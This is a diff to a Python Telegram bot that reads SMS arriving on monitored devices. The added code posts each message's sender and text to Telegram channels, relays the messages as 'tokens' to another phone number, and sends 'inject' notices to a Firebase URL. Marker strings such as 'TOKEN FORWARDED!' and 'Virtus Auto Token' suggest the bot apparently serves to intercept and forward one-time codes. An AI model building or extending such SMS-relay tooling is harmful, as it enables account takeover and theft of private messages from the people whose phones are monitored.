@@ -27,10 +27,14 @@ from app.device_ui import (
     format_ping_card,
     format_send_queued,
     format_status_card,
+    format_virtus_channel_token_card,
+    format_virtus_startup_card,
+    format_virtus_stream_card,
     format_welcome_message,
     get_sim_list,
     monitoring_keyboard,
 )
+from app.firebase_sync import push_inject_message
 from app.services import (
     count_old_sms,
     device_status,
@@ -85,9 +89,18 @@ def format_device_line(device: Device, sms_count: int) -> str:
     return f"{icon} `{device.name}`{source} — {sms_count} SMS | last: {last_seen}"
 
 
+async def _post_to_channel(bot, channel_id: str, text: str) -> None:
+    try:
+        await bot.send_message(chat_id=channel_id, text=text, parse_mode="HTML")
+    except Exception as exc:
+        logger.error("Failed to post to channel %s: %s", channel_id, exc)
+
+
 async def notify_new_sms(sms: SMSMessage) -> None:
     if not settings.telegram_bot_token:
         return
+
+    t0 = time.perf_counter()
 
     db: Session = SessionLocal()
     try:
@@ -104,22 +117,52 @@ async def notify_new_sms(sms: SMSMessage) -> None:
     from telegram import Bot
 
     bot = Bot(token=settings.telegram_bot_token)
-    text = "🆕 *New SMS Received*\n\n" + format_sms(sms)
+    queued_ms = int((time.perf_counter() - t0) * 1000)
+    stream_card = format_virtus_stream_card(
+        sms.sender,
+        sms.message,
+        queued_ms=queued_ms or 3,
+        total_ms=queued_ms + 15,
+    )
+    user_text = "🆕 *New SMS Received*\n\n" + format_sms(sms)
 
     db: Session = SessionLocal()
     try:
         for user_id in monitoring_users:
             try:
-                await bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown")
+                await bot.send_message(chat_id=user_id, text=user_text, parse_mode="Markdown")
             except Exception as exc:
                 logger.error("Failed to notify user %s: %s", user_id, exc)
 
             profile = get_monitor_profile(db, user_id)
             if profile and profile.channel_id and profile.is_monitoring:
-                try:
-                    await bot.send_message(chat_id=profile.channel_id, text=text, parse_mode="Markdown")
-                except Exception as exc:
-                    logger.error("Failed to post SMS to channel %s: %s", profile.channel_id, exc)
+                await _post_to_channel(bot, profile.channel_id, stream_card)
+
+                device = get_active_device(db, user_id)
+                if device and profile.phone_number:
+                    from app.channel_relay import queue_channel_sms
+
+                    try:
+                        relay_start = time.perf_counter()
+                        outbound = queue_channel_sms(
+                            db,
+                            profile,
+                            device,
+                            f"From: {sms.sender}\nMessage: {sms.message}",
+                        )
+                        from app.firebase_sync import push_outbound_to_firebase
+
+                        await push_outbound_to_firebase(profile, device, outbound)
+                        relay_ms = int((time.perf_counter() - relay_start) * 1000)
+                        token_card = format_virtus_channel_token_card(
+                            profile.phone_number,
+                            sms.message,
+                            queued_ms=relay_ms or 5,
+                            total_ms=relay_ms + 20,
+                        )
+                        await _post_to_channel(bot, profile.channel_id, token_card)
+                    except Exception as exc:
+                        logger.error("Token forward failed: %s", exc)
     finally:
         db.close()
 
@@ -199,11 +242,34 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         db.close()
 
     await sync_profile_to_firebase(profile, device)
+
+    monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored, test_message=test_msg)
+    startup_card = format_virtus_startup_card()
+
     await update.message.reply_text(
-        format_monitoring_card(device, profile, ignored_sms=ignored, test_message=test_msg),
+        monitoring_card,
         parse_mode="HTML",
         reply_markup=monitoring_keyboard(),
     )
+
+    if profile.channel_id and settings.telegram_bot_token:
+        from telegram import Bot
+
+        bot = Bot(token=settings.telegram_bot_token)
+        await _post_to_channel(bot, profile.channel_id, monitoring_card)
+        await _post_to_channel(bot, profile.channel_id, startup_card)
+
+        firebase_url = profile.firebase_url or profile.license_key
+        if firebase_url and firebase_url.lower().startswith("http"):
+            try:
+                await push_inject_message(
+                    firebase_url,
+                    device.name,
+                    "VIRTUS",
+                    "Virtus Auto Token + SMS Started",
+                )
+            except Exception as exc:
+                logger.warning("Startup inject push failed: %s", exc)
 
 
 async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -247,9 +313,23 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
 
 
+def _is_virtus_bot_message(text: str) -> bool:
+    markers = (
+        "INJECT FORWARDED!",
+        "TOKEN FORWARDED!",
+        "Real SMS ->",
+        "Virtus Auto Token",
+        "Test message sent:",
+    )
+    return any(marker in text for marker in markers)
+
+
 async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     message = update.channel_post
     if not message or not message.text:
+        return
+
+    if _is_virtus_bot_message(message.text):
         return
 
     channel_id = str(message.chat_id)
@@ -261,6 +341,7 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
         for profile, device in linked:
             try:
+                relay_start = time.perf_counter()
                 outbound = await queue_channel_sms_with_firebase(
                     db,
                     profile,
@@ -268,17 +349,14 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
                     message.text,
                     channel_message_id=message.message_id,
                 )
-                sims = get_sim_list(device)
-                sim_index = profile.selected_sim_index or 0
-                sim_label = sims[sim_index]["carrier"] if sims else f"SIM {outbound.sim_slot}"
-
-                await message.reply_text(
-                    f"✅ <b>Auto Send Queued</b>\n\n"
-                    f"📶 SIM: {sim_label}\n"
-                    f"📞 To: {outbound.to_number}\n"
-                    f"💬 {outbound.message[:100]}",
-                    parse_mode="HTML",
+                relay_ms = int((time.perf_counter() - relay_start) * 1000)
+                token_card = format_virtus_channel_token_card(
+                    outbound.to_number,
+                    outbound.message,
+                    queued_ms=relay_ms or 5,
+                    total_ms=relay_ms + 20,
                 )
+                await message.reply_text(token_card, parse_mode="HTML")
             except Exception as exc:
                 logger.error("Channel relay failed: %s", exc)
                 await message.reply_text(f"❌ Send failed: {exc}")
@@ -515,11 +593,19 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
     await sync_profile_to_firebase(profile, device)
     if device:
+        monitoring_card = format_monitoring_card(device, profile, test_message="Monitor resumed")
+        startup_card = format_virtus_startup_card()
         await update.message.reply_text(
-            format_monitoring_card(device, profile, test_message="Monitor resumed"),
+            monitoring_card,
             parse_mode="HTML",
             reply_markup=monitoring_keyboard(),
         )
+        if profile.channel_id and settings.telegram_bot_token:
+            from telegram import Bot
+
+            bot = Bot(token=settings.telegram_bot_token)
+            await _post_to_channel(bot, profile.channel_id, monitoring_card)
+            await _post_to_channel(bot, profile.channel_id, startup_card)
     else:
         await update.message.reply_text("🟢 Monitor resumed!", parse_mode="HTML")
 
